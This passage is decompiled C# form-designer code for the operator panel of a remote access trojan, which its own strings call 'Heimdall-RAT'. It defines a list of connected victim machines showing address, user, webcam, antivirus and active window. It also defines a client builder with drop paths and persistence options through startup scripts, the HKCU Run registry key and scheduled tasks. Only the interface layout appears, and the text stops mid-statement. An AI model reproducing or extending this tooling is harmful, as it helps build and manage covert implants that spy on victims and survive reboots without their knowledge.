		((ToolStripItem)obj).set_Size(size);
		((ToolStripItem)clientslabel).set_Text("Connected Clients : ( 0 ) | Selected Clients : ( 0 )");
		((Control)listV1).set_Anchor((AnchorStyles)15);
		listV1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[13]
		{
			ColumnHeader1, ColumnHeader2, ColumnHeader3, ColumnHeader4, ColumnHeader5, ColumnHeader6, ColumnHeader7, ColumnHeader8, ColumnHeader9, ColumnHeader10,
			ColumnHeader11, ColumnHeader12, ColumnHeader13
		});
		((Control)listV1).set_ContextMenuStrip(ClientMenu);
		((Control)listV1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		listV1.set_FullRowSelect(true);
		listV1.set_GridLines(true);
		listV1.set_HideSelection(false);
		listV1.set_LargeImageList(ImageList1);
		ListView obj2 = listV1;
		location = new Point(3, 3);
		((Control)obj2).set_Location(location);
		((Control)listV1).set_Name("listV1");
		ListView obj3 = listV1;
		size = new Size(990, 397);
		((Control)obj3).set_Size(size);
		listV1.set_SmallImageList(ImageList1);
		((Control)listV1).set_TabIndex(2);
		listV1.set_UseCompatibleStateImageBehavior(false);
		listV1.set_View((View)1);
		ColumnHeader1.set_Text("Location");
		ColumnHeader1.set_Width(78);
		ColumnHeader2.set_Text("Identification");
		ColumnHeader2.set_Width(104);
		ColumnHeader3.set_Text("Wan | Lan");
		ColumnHeader3.set_Width(101);
		ColumnHeader4.set_Text("Computer | User");
		ColumnHeader4.set_Width(152);
		ColumnHeader5.set_Text("Cam");
		ColumnHeader5.set_Width(67);
		ColumnHeader6.set_Text("Operation System");
		ColumnHeader6.set_Width(163);
		ColumnHeader7.set_Text("CPU");
		ColumnHeader7.set_Width(87);
		ColumnHeader8.set_Text("RAM");
		ColumnHeader8.set_Width(72);
		ColumnHeader9.set_Text("Antivirus");
		ColumnHeader9.set_Width(101);
		ColumnHeader10.set_Text("Firewall");
		ColumnHeader10.set_Width(90);
		ColumnHeader11.set_Text("Install Date");
		ColumnHeader11.set_Width(102);
		ColumnHeader12.set_Text("Latency");
		ColumnHeader12.set_Width(79);
		ColumnHeader13.set_Text("Active Window");
		ColumnHeader13.set_Width(117);
		((Control)TabPage5).get_Controls().Add((Control)(object)Panel2);
		TabPage tabPage10 = TabPage5;
		location = new Point(154, 4);
		tabPage10.set_Location(location);
		((Control)TabPage5).set_Name("TabPage5");
		TabPage tabPage11 = TabPage5;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage11).set_Padding(padding);
		TabPage tabPage12 = TabPage5;
		size = new Size(974, 465);
		((Control)tabPage12).set_Size(size);
		TabPage5.set_TabIndex(2);
		TabPage5.set_Text("Client Builder");
		TabPage5.set_UseVisualStyleBackColor(true);
		((Control)Panel2).get_Controls().Add((Control)(object)GroupBox9);
		((Control)Panel2).get_Controls().Add((Control)(object)GroupBox2);
		((Control)Panel2).get_Controls().Add((Control)(object)GroupBox1);
		((Control)Panel2).set_Dock((DockStyle)5);
		Panel panel = Panel2;
		location = new Point(3, 3);
		((Control)panel).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel2 = Panel2;
		size = new Size(968, 459);
		((Control)panel2).set_Size(size);
		((Control)Panel2).set_TabIndex(0);
		((Control)GroupBox9).get_Controls().Add((Control)(object)GroupBox15);
		((Control)GroupBox9).get_Controls().Add((Control)(object)GroupBox10);
		GroupBox groupBox = GroupBox9;
		location = new Point(298, 4);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox9).set_Name("GroupBox9");
		GroupBox groupBox2 = GroupBox9;
		size = new Size(364, 486);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox9).set_TabIndex(11);
		GroupBox9.set_TabStop(false);
		((Control)GroupBox15).get_Controls().Add((Control)(object)Label29);
		((Control)GroupBox15).get_Controls().Add((Control)(object)Label28);
		((Control)GroupBox15).get_Controls().Add((Control)(object)Label7);
		((Control)GroupBox15).get_Controls().Add((Control)(object)Label6);
		((Control)GroupBox15).get_Controls().Add((Control)(object)MSGPic);
		((Control)GroupBox15).get_Controls().Add((Control)(object)MSGPRI);
		((Control)GroupBox15).get_Controls().Add((Control)(object)MSGBUTTON);
		((Control)GroupBox15).get_Controls().Add((Control)(object)MSGICON);
		((Control)GroupBox15).get_Controls().Add((Control)(object)MSGB);
		((Control)GroupBox15).get_Controls().Add((Control)(object)MSGT);
		((Control)GroupBox15).get_Controls().Add((Control)(object)CBMSG);
		((Control)GroupBox15).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1));
		GroupBox groupBox3 = GroupBox15;
		location = new Point(6, 268);
		((Control)groupBox3).set_Location(location);
		((Control)GroupBox15).set_Name("GroupBox15");
		GroupBox groupBox4 = GroupBox15;
		size = new Size(352, 212);
		((Control)groupBox4).set_Size(size);
		((Control)GroupBox15).set_TabIndex(1);
		GroupBox15.set_TabStop(false);
		GroupBox15.set_Text("Notification");
		Label29.set_AutoSize(true);
		((Control)Label29).set_Enabled(false);
		((Control)Label29).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label29;
		location = new Point(196, 134);
		((Control)label).set_Location(location);
		((Control)Label29).set_Name("Label29");
		Label label2 = Label29;
		size = new Size(93, 13);
		((Control)label2).set_Size(size);
		((Control)Label29).set_TabIndex(20);
		Label29.set_Text("Dialog Button :");
		Label28.set_AutoSize(true);
		((Control)Label28).set_Enabled(false);
		((Control)Label28).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label28;
		location = new Point(196, 83);
		((Control)label3).set_Location(location);
		((Control)Label28).set_Name("Label28");
		Label label4 = Label28;
		size = new Size(81, 13);
		((Control)label4).set_Size(size);
		((Control)Label28).set_TabIndex(19);
		Label28.set_Text("Dialog Icon :");
		Label7.set_AutoSize(true);
		((Control)Label7).set_Enabled(false);
		((Control)Label7).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label5 = Label7;
		location = new Point(7, 39);
		((Control)label5).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label6 = Label7;
		size = new Size(80, 13);
		((Control)label6).set_Size(size);
		((Control)Label7).set_TabIndex(18);
		Label7.set_Text("Dialog Title :");
		Label6.set_AutoSize(true);
		((Control)Label6).set_Enabled(false);
		((Control)Label6).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label7 = Label6;
		location = new Point(7, 84);
		((Control)label7).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label8 = Label6;
		size = new Size(85, 13);
		((Control)label8).set_Size(size);
		((Control)Label6).set_TabIndex(17);
		Label6.set_Text("Dialog Body :");
		((Control)MSGPic).set_Enabled(false);
		PictureBox mSGPic = MSGPic;
		location = new Point(305, 69);
		((Control)mSGPic).set_Location(location);
		((Control)MSGPic).set_Name("MSGPic");
		PictureBox mSGPic2 = MSGPic;
		size = new Size(34, 27);
		((Control)mSGPic2).set_Size(size);
		MSGPic.set_SizeMode((PictureBoxSizeMode)1);
		MSGPic.set_TabIndex(16);
		MSGPic.set_TabStop(false);
		((Control)MSGPRI).set_Enabled(false);
		Button mSGPRI = MSGPRI;
		location = new Point(196, 181);
		((Control)mSGPRI).set_Location(location);
		((Control)MSGPRI).set_Name("MSGPRI");
		Button mSGPRI2 = MSGPRI;
		size = new Size(143, 23);
		((Control)mSGPRI2).set_Size(size);
		((Control)MSGPRI).set_TabIndex(15);
		((ButtonBase)MSGPRI).set_Text("Preview");
		((ButtonBase)MSGPRI).set_UseVisualStyleBackColor(true);
		((ListControl)MSGBUTTON).set_DisplayMember("1");
		MSGBUTTON.set_DropDownStyle((ComboBoxStyle)2);
		((Control)MSGBUTTON).set_Enabled(false);
		((Control)MSGBUTTON).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)MSGBUTTON).set_FormattingEnabled(true);
		MSGBUTTON.get_Items().AddRange(new object[6] { "AbortRetryIgnore", "YesNoCancel", "RetryCancel", "OKCancel", "YesNo", "OK" });
		ComboBox mSGBUTTON = MSGBUTTON;
		location = new Point(196, 155);
		((Control)mSGBUTTON).set_Location(location);
		((Control)MSGBUTTON).set_Name("MSGBUTTON");
		ComboBox mSGBUTTON2 = MSGBUTTON;
		size = new Size(143, 21);
		((Control)mSGBUTTON2).set_Size(size);
		((Control)MSGBUTTON).set_TabIndex(14);
		((ListControl)MSGICON).set_DisplayMember("1");
		MSGICON.set_DropDownStyle((ComboBoxStyle)2);
		((Control)MSGICON).set_Enabled(false);
		((Control)MSGICON).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)MSGICON).set_FormattingEnabled(true);
		MSGICON.get_Items().AddRange(new object[5] { "Information", "Question", "Warning", "Error", "None" });
		ComboBox mSGICON = MSGICON;
		location = new Point(196, 107);
		((Control)mSGICON).set_Location(location);
		((Control)MSGICON).set_Name("MSGICON");
		ComboBox mSGICON2 = MSGICON;
		size = new Size(143, 21);
		((Control)mSGICON2).set_Size(size);
		((Control)MSGICON).set_TabIndex(13);
		((Control)MSGB).set_Enabled(false);
		((Control)MSGB).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox mSGB = MSGB;
		location = new Point(6, 102);
		((Control)mSGB).set_Location(location);
		MSGB.set_Multiline(true);
		((Control)MSGB).set_Name("MSGB");
		TextBox mSGB2 = MSGB;
		size = new Size(187, 105);
		((Control)mSGB2).set_Size(size);
		((Control)MSGB).set_TabIndex(3);
		MSGB.set_Text("Heimdall-RAT client has been successfully installed.");
		((Control)MSGT).set_Enabled(false);
		((Control)MSGT).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox mSGT = MSGT;
		location = new Point(6, 58);
		((Control)mSGT).set_Location(location);
		((Control)MSGT).set_Name("MSGT");
		TextBox mSGT2 = MSGT;
		size = new Size(187, 21);
		((Control)mSGT2).set_Size(size);
		((Control)MSGT).set_TabIndex(2);
		MSGT.set_Text("Installation");
		((ButtonBase)CBMSG).set_AutoSize(true);
		CheckBox cBMSG = CBMSG;
		location = new Point(6, 17);
		((Control)cBMSG).set_Location(location);
		((Control)CBMSG).set_Name("CBMSG");
		CheckBox cBMSG2 = CBMSG;
		size = new Size(124, 19);
		((Control)cBMSG2).set_Size(size);
		((Control)CBMSG).set_TabIndex(1);
		((ButtonBase)CBMSG).set_Text("Install Notification");
		((ButtonBase)CBMSG).set_UseVisualStyleBackColor(true);
		((Control)GroupBox10).get_Controls().Add((Control)(object)TabControl2);
		((Control)GroupBox10).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1));
		((Control)GroupBox10).set_ForeColor(SystemColors.ActiveCaptionText);
		GroupBox groupBox5 = GroupBox10;
		location = new Point(6, 15);
		((Control)groupBox5).set_Location(location);
		((Control)GroupBox10).set_Name("GroupBox10");
		GroupBox groupBox6 = GroupBox10;
		size = new Size(352, 247);
		((Control)groupBox6).set_Size(size);
		((Control)GroupBox10).set_TabIndex(0);
		GroupBox10.set_TabStop(false);
		GroupBox10.set_Text("Install");
		((Control)TabControl2).get_Controls().Add((Control)(object)TabPage17);
		((Control)TabControl2).get_Controls().Add((Control)(object)TabPage14);
		((Control)TabControl2).get_Controls().Add((Control)(object)TabPage15);
		((Control)TabControl2).get_Controls().Add((Control)(object)TabPage16);
		TabControl tabControl = TabControl2;
		location = new Point(6, 15);
		((Control)tabControl).set_Location(location);
		((Control)TabControl2).set_Name("TabControl2");
		TabControl2.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl2;
		size = new Size(340, 211);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl2).set_TabIndex(0);
		((Control)TabPage17).get_Controls().Add((Control)(object)CBdrop);
		((Control)TabPage17).get_Controls().Add((Control)(object)GroupBox11);
		TabPage tabPage13 = TabPage17;
		location = new Point(4, 24);
		tabPage13.set_Location(location);
		((Control)TabPage17).set_Name("TabPage17");
		TabPage tabPage14 = TabPage17;
		size = new Size(332, 183);
		((Control)tabPage14).set_Size(size);
		TabPage17.set_TabIndex(4);
		TabPage17.set_Text("Drop Path");
		TabPage17.set_UseVisualStyleBackColor(true);
		((ButtonBase)CBdrop).set_AutoSize(true);
		CheckBox cBdrop = CBdrop;
		location = new Point(3, 9);
		((Control)cBdrop).set_Location(location);
		((Control)CBdrop).set_Name("CBdrop");
		CheckBox cBdrop2 = CBdrop;
		size = new Size(53, 19);
		((Control)cBdrop2).set_Size(size);
		((Control)CBdrop).set_TabIndex(1);
		((ButtonBase)CBdrop).set_Text("Drop");
		((ButtonBase)CBdrop).set_UseVisualStyleBackColor(true);
		((Control)GroupBox11).get_Controls().Add((Control)(object)Label19);
		((Control)GroupBox11).get_Controls().Add((Control)(object)CDP);
		((Control)GroupBox11).get_Controls().Add((Control)(object)Label18);
		((Control)GroupBox11).get_Controls().Add((Control)(object)TBDN);
		((Control)GroupBox11).set_Enabled(false);
		GroupBox groupBox7 = GroupBox11;
		location = new Point(3, 24);
		((Control)groupBox7).set_Location(location);
		((Control)GroupBox11).set_Name("GroupBox11");
		GroupBox groupBox8 = GroupBox11;
		size = new Size(326, 74);
		((Control)groupBox8).set_Size(size);
		((Control)GroupBox11).set_TabIndex(0);
		GroupBox11.set_TabStop(false);
		Label19.set_AutoSize(true);
		((Control)Label19).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label9 = Label19;
		location = new Point(6, 22);
		((Control)label9).set_Location(location);
		((Control)Label19).set_Name("Label19");
		Label label10 = Label19;
		size = new Size(73, 13);
		((Control)label10).set_Size(size);
		((Control)Label19).set_TabIndex(12);
		Label19.set_Text("Drop Path :");
		CDP.set_DropDownStyle((ComboBoxStyle)2);
		((Control)CDP).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)CDP).set_FormattingEnabled(true);
		CDP.get_Items().AddRange(new object[5] { "ApplicationData", "History", "MyDocuments", "StartMenu", "Templates" });
		ComboBox cDP = CDP;
		location = new Point(96, 17);
		((Control)cDP).set_Location(location);
		((Control)CDP).set_Name("CDP");
		ComboBox cDP2 = CDP;
		size = new Size(224, 21);
		((Control)cDP2).set_Size(size);
		((Control)CDP).set_TabIndex(11);
		Label18.set_AutoSize(true);
		((Control)Label18).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label11 = Label18;
		location = new Point(6, 43);
		((Control)label11).set_Location(location);
		((Control)Label18).set_Name("Label18");
		Label label12 = Label18;
		size = new Size(81, 13);
		((Control)label12).set_Size(size);
		((Control)Label18).set_TabIndex(10);
		Label18.set_Text("Drop Name :");
		((Control)TBDN).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBDN = TBDN;
		location = new Point(96, 40);
		((Control)tBDN).set_Location(location);
		((Control)TBDN).set_Name("TBDN");
		TextBox tBDN2 = TBDN;
		size = new Size(224, 21);
		((Control)tBDN2).set_Size(size);
		((Control)TBDN).set_TabIndex(9);
		TBDN.set_Text("Client");
		((Control)TabPage14).get_Controls().Add((Control)(object)TBVBS);
		((Control)TabPage14).get_Controls().Add((Control)(object)CBVBS);
		((Control)TabPage14).get_Controls().Add((Control)(object)TBJS);
		((Control)TabPage14).get_Controls().Add((Control)(object)CBJS);
		((Control)TabPage14).get_Controls().Add((Control)(object)TBURL);
		((Control)TabPage14).get_Controls().Add((Control)(object)CBURL);
		((Control)TabPage14).get_Controls().Add((Control)(object)TBSEXE);
		((Control)TabPage14).get_Controls().Add((Control)(object)CBSEXE);
		TabPage tabPage15 = TabPage14;
		location = new Point(4, 24);
		tabPage15.set_Location(location);
		((Control)TabPage14).set_Name("TabPage14");
		TabPage tabPage16 = TabPage14;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage16).set_Padding(padding);
		TabPage tabPage17 = TabPage14;
		size = new Size(332, 183);
		((Control)tabPage17).set_Size(size);
		TabPage14.set_TabIndex(0);
		TabPage14.set_Text("StartUp");
		TabPage14.set_UseVisualStyleBackColor(true);
		((Control)TBVBS).set_Enabled(false);
		((Control)TBVBS).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBVBS = TBVBS;
		location = new Point(6, 155);
		((Control)tBVBS).set_Location(location);
		((Control)TBVBS).set_Name("TBVBS");
		TextBox tBVBS2 = TBVBS;
		size = new Size(206, 21);
		((Control)tBVBS2).set_Size(size);
		((Control)TBVBS).set_TabIndex(10);
		TBVBS.set_Text("Client");
		((ButtonBase)CBVBS).set_AutoSize(true);
		CheckBox cBVBS = CBVBS;
		location = new Point(6, 136);
		((Control)cBVBS).set_Location(location);
		((Control)CBVBS).set_Name("CBVBS");
		CheckBox cBVBS2 = CBVBS;
		size = new Size(98, 19);
		((Control)cBVBS2).set_Size(size);
		((Control)CBVBS).set_TabIndex(9);
		((ButtonBase)CBVBS).set_Text("StartUp (.vbs)");
		((ButtonBase)CBVBS).set_UseVisualStyleBackColor(true);
		((Control)TBJS).set_Enabled(false);
		((Control)TBJS).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBJS = TBJS;
		location = new Point(6, 112);
		((Control)tBJS).set_Location(location);
		((Control)TBJS).set_Name("TBJS");
		TextBox tBJS2 = TBJS;
		size = new Size(206, 21);
		((Control)tBJS2).set_Size(size);
		((Control)TBJS).set_TabIndex(8);
		TBJS.set_Text("Client");
		((ButtonBase)CBJS).set_AutoSize(true);
		CheckBox cBJS = CBJS;
		location = new Point(6, 93);
		((Control)cBJS).set_Location(location);
		((Control)CBJS).set_Name("CBJS");
		CheckBox cBJS2 = CBJS;
		size = new Size(88, 19);
		((Control)cBJS2).set_Size(size);
		((Control)CBJS).set_TabIndex(7);
		((ButtonBase)CBJS).set_Text("StartUp (.js)");
		((ButtonBase)CBJS).set_UseVisualStyleBackColor(true);
		((Control)TBURL).set_Enabled(false);
		((Control)TBURL).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBURL = TBURL;
		location = new Point(6, 68);
		((Control)tBURL).set_Location(location);
		((Control)TBURL).set_Name("TBURL");
		TextBox tBURL2 = TBURL;
		size = new Size(206, 21);
		((Control)tBURL2).set_Size(size);
		((Control)TBURL).set_TabIndex(4);
		TBURL.set_Text("Client");
		((ButtonBase)CBURL).set_AutoSize(true);
		CheckBox cBURL = CBURL;
		location = new Point(6, 49);
		((Control)cBURL).set_Location(location);
		((Control)CBURL).set_Name("CBURL");
		CheckBox cBURL2 = CBURL;
		size = new Size(94, 19);
		((Control)cBURL2).set_Size(size);
		((Control)CBURL).set_TabIndex(3);
		((ButtonBase)CBURL).set_Text("StartUp (.url)");
		((ButtonBase)CBURL).set_UseVisualStyleBackColor(true);
		((Control)TBSEXE).set_Enabled(false);
		((Control)TBSEXE).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBSEXE = TBSEXE;
		location = new Point(6, 25);
		((Control)tBSEXE).set_Location(location);
		((Control)TBSEXE).set_Name("TBSEXE");
		TextBox tBSEXE2 = TBSEXE;
		size = new Size(206, 21);
		((Control)tBSEXE2).set_Size(size);
		((Control)TBSEXE).set_TabIndex(2);
		TBSEXE.set_Text("Client");
		((ButtonBase)CBSEXE).set_AutoSize(true);
		CheckBox cBSEXE = CBSEXE;
		location = new Point(6, 6);
		((Control)cBSEXE).set_Location(location);
		((Control)CBSEXE).set_Name("CBSEXE");
		CheckBox cBSEXE2 = CBSEXE;
		size = new Size(98, 19);
		((Control)cBSEXE2).set_Size(size);
		((Control)CBSEXE).set_TabIndex(1);
		((ButtonBase)CBSEXE).set_Text("StartUp (.exe)");
		((ButtonBase)CBSEXE).set_UseVisualStyleBackColor(true);
		((Control)TabPage15).get_Controls().Add((Control)(object)CBREG);
		((Control)TabPage15).get_Controls().Add((Control)(object)GroupBox12);
		TabPage tabPage18 = TabPage15;
		location = new Point(4, 24);
		tabPage18.set_Location(location);
		((Control)TabPage15).set_Name("TabPage15");
		TabPage tabPage19 = TabPage15;
		size = new Size(332, 183);
		((Control)tabPage19).set_Size(size);
		TabPage15.set_TabIndex(3);
		TabPage15.set_Text("Registry");
		TabPage15.set_UseVisualStyleBackColor(true);
		((ButtonBase)CBREG).set_AutoSize(true);
		CheckBox cBREG = CBREG;
		location = new Point(3, 9);
		((Control)cBREG).set_Location(location);
		((Control)CBREG).set_Name("CBREG");
		CheckBox cBREG2 = CBREG;
		size = new Size(68, 19);
		((Control)cBREG2).set_Size(size);
		((Control)CBREG).set_TabIndex(3);
		((ButtonBase)CBREG).set_Text("Registry");
		((ButtonBase)CBREG).set_UseVisualStyleBackColor(true);
		((Control)GroupBox12).get_Controls().Add((Control)(object)TBRK);
		((Control)GroupBox12).get_Controls().Add((Control)(object)Label20);
		((Control)GroupBox12).get_Controls().Add((Control)(object)Label21);
		((Control)GroupBox12).get_Controls().Add((Control)(object)TBRV);
		((Control)GroupBox12).set_Enabled(false);
		GroupBox groupBox9 = GroupBox12;
		location = new Point(3, 24);
		((Control)groupBox9).set_Location(location);
		((Control)GroupBox12).set_Name("GroupBox12");
		GroupBox groupBox10 = GroupBox12;
		size = new Size(326, 74);
		((Control)groupBox10).set_Size(size);
		((Control)GroupBox12).set_TabIndex(2);
		GroupBox12.set_TabStop(false);
		((Control)TBRK).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBRK = TBRK;
		location = new Point(101, 20);
		((Control)tBRK).set_Location(location);
		((Control)TBRK).set_Name("TBRK");
		TextBox tBRK2 = TBRK;
		size = new Size(219, 21);
		((Control)tBRK2).set_Size(size);
		((Control)TBRK).set_TabIndex(13);
		TBRK.set_Text("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		Label20.set_AutoSize(true);
		((Control)Label20).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label13 = Label20;
		location = new Point(6, 24);
		((Control)label13).set_Location(location);
		((Control)Label20).set_Name("Label20");
		Label label14 = Label20;
		size = new Size(89, 13);
		((Control)label14).set_Size(size);
		((Control)Label20).set_TabIndex(12);
		Label20.set_Text("Registry Key :");
		Label21.set_AutoSize(true);
		((Control)Label21).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label15 = Label21;
		location = new Point(6, 46);
		((Control)label15).set_Location(location);
		((Control)Label21).set_Name("Label21");
		Label label16 = Label21;
		size = new Size(135, 13);
		((Control)label16).set_Size(size);
		((Control)Label21).set_TabIndex(10);
		Label21.set_Text("Registry Value Name :");
		((Control)TBRV).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBRV = TBRV;
		location = new Point(141, 42);
		((Control)tBRV).set_Location(location);
		((Control)TBRV).set_Name("TBRV");
		TextBox tBRV2 = TBRV;
		size = new Size(179, 21);
		((Control)tBRV2).set_Size(size);
		((Control)TBRV).set_TabIndex(9);
		TBRV.set_Text("Client");
		((Control)TabPage16).get_Controls().Add((Control)(object)CBST);
		((Control)TabPage16).get_Controls().Add((Control)(object)GroupBox13);
		TabPage tabPage20 = TabPage16;
		location = new Point(4, 24);
		tabPage20.set_Location(location);
		((Control)TabPage16).set_Name("TabPage16");
		TabPage tabPage21 = TabPage16;
		size = new Size(332, 183);
		((Control)tabPage21).set_Size(size);
		TabPage16.set_TabIndex(2);
		TabPage16.set_Text("Scheduled Task");
		TabPage16.set_UseVisualStyleBackColor(true);
		((ButtonBase)CBST).set_AutoSize(true);
		CheckBox cBST = CBST;
		location = new Point(3, 9);
		((Control)cBST).set_Location(location);
		((Control)CBST).set_Name("CBST");
		CheckBox cBST2 = CBST;
		size = new Size(108, 19);
		((Control)cBST2).set_Size(size);
		((Control)CBST).set_TabIndex(3);
		((ButtonBase)CBST).set_Text("Scheduled Task");
		((ButtonBase)CBST).set_UseVisualStyleBackColor(true);
		((Control)GroupBox13).get_Controls().Add((Control)(object)Label25);
		((Control)GroupBox13).get_Controls().Add((Control)(object)TBSTT);
		((Control)GroupBox13).get_Controls().Add((Control)(object)Label22);
		((Control)GroupBox13).get_Controls().Add((Control)(object)Label23);
		((Control)GroupBox13).get_Controls().Add((Control)(object)TBSTN);
		((Control)GroupBox13).set_Enabled(false);
		GroupBox groupBox11 = GroupBox13;
		location = new Point(3, 24);
		((Control)groupBox11).set_Location(location);
		((Control)GroupBox13).set_Name("GroupBox13");
		GroupBox groupBox12 = GroupBox13;
		size = new Size(326, 74);
		((Control)groupBox12).set_Size(size);
		((Control)GroupBox13).set_TabIndex(2);
		GroupBox13.set_TabStop(false);
		Label25.set_AutoSize(true);
		((Control)Label25).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label17 = Label25;
		location = new Point(210, 46);
		((Control)label17).set_Location(location);
		((Control)Label25).set_Name("Label25");
		Label label18 = Label25;
		size = new Size(46, 13);
		((Control)label18).set_Size(size);
		((Control)Label25).set_TabIndex(14);
		Label25.set_Text("minute");
		((Control)TBSTT).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown tBSTT = TBSTT;
		location = new Point(154, 43);
		((Control)tBSTT).set_Location(location);
		NumericUpDown tBSTT2 = TBSTT;
		decimal num = new decimal(new int[4] { 10000, 0, 0, 0 });
		tBSTT2.set_Maximum(num);
		NumericUpDown tBSTT3 = TBSTT;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		tBSTT3.set_Minimum(num);
		((Control)TBSTT).set_Name("TBSTT");
		NumericUpDown tBSTT4 = TBSTT;
		size = new Size(50, 21);
		((Control)tBSTT4).set_Size(size);
		((Control)TBSTT).set_TabIndex(13);
		NumericUpDown tBSTT5 = TBSTT;
		num = new decimal(new int[4] { 60, 0, 0, 0 });
		tBSTT5.set_Value(num);
		Label22.set_AutoSize(true);
		((Control)Label22).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label19 = Label22;
		location = new Point(6, 23);
		((Control)label19).set_Location(location);
		((Control)Label22).set_Name("Label22");
		Label label20 = Label22;
		size = new Size(142, 13);
		((Control)label20).set_Size(size);
		((Control)Label22).set_TabIndex(12);
		Label22.set_Text("Scheduled Task Name :");
		Label23.set_AutoSize(true);
		((Control)Label23).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label21 = Label23;
		location = new Point(6, 44);
		((Control)label21).set_Location(location);
		((Control)Label23).set_Name("Label23");
		Label label22 = Label23;
		size = new Size(137, 13);
		((Control)label22).set_Size(size);
		((Control)Label23).set_TabIndex(10);
		Label23.set_Text("Scheduled Task Time :");
		((Control)TBSTN).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox tBSTN = TBSTN;
		location = new Point(154, 20);
		((Control)tBSTN).set_Location(location);
		((Control)TBSTN).set_Name("TBSTN");
		TextBox tBSTN2 = TBSTN;
		size = new Size(162, 21);
		((Control)tBSTN2).set_Size(size);
		((Control)TBSTN).set_TabIndex(9);
		TBSTN.set_Text("Client");
		((Control)GroupBox2).get_Controls().Add((Control)(object)Button7);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Button6);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Button4);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Button3);
		((Control)GroupBox2).get_Controls().Add((Control)(object)GroupBox16);
		((Control)GroupBox2).get_Controls().Add((Control)(object)GroupBox5);
		((Control)GroupBox2).get_Controls().Add((Control)(object)GroupBox7);
		((Control)GroupBox2).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		GroupBox groupBox13 = GroupBox2;
		location = new Point(668, 4);
		((Control)groupBox13).set_Location(location);
		((Control)GroupBox2).set_Name("GroupBox2");
		GroupBox groupBox14 = GroupBox2;
		size = new Size(283, 486);
		((Control)groupBox14).set_Size(size);
		((Control)GroupBox2).set_TabIndex(10);
		GroupBox2.set_TabStop(false);
		Button button = Button7;
		location = new Point(143, 457);
		((Control)button).set_Location(location);
		((Control)Button7).set_Name("Button7");
		Button button2 = Button7;
		size = new Size(67, 23);
		((Control)button2).set_Size(size);
		((Control)Button7).set_TabIndex(13);
		((ButtonBase)Button7).set_Text("Save");
		((ButtonBase)Button7).set_UseVisualStyleBackColor(true);
		Button button3 = Button6;
		location = new Point(210, 457);
		((Control)button3).set_Location(location);
		((Control)Button6).set_Name("Button6");
		Button button4 = Button6;
		size = new Size(67, 23);
		((Control)button4).set_Size(size);
		((Control)Button6).set_TabIndex(12);
		((ButtonBase)Button6).set_Text("Build");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		Button button5 = Button4;
		location = new Point(76, 457);
		((Control)button5).set_Location(location);
		((Control)Button4).set_Name("Button4");
		Button button6 = Button4;
		size = new Size(67, 23);
		((Control)button6).set_Size(size);
		((Control)Button4).set_TabIndex(11);
		((ButtonBase)Button4).set_Text("Profiles");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(true);
		Button button7 = Button3;
		location = new Point(9, 457);
		((Control)button7).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button8 = Button3;
